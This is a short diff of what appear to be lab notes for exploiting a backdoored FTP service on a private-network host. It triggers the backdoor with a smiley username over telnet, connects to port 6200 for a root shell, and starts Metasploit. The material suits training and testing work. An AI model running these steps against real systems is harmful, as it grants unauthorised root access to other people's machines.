@@ -7,7 +7,8 @@ telnet 10.30.0.235 21 (Then type: USER frankie:) and PASS 123)
 
 3. Verify interactive root shell	telnet			
 telnet 10.30.0.235 6200
-(Then type: whoami and id)
+(Then type: whoami; and id;)
+exit;
 
 4. Initialize exploit database		bash			
 sudo msfdb init && msfconsole
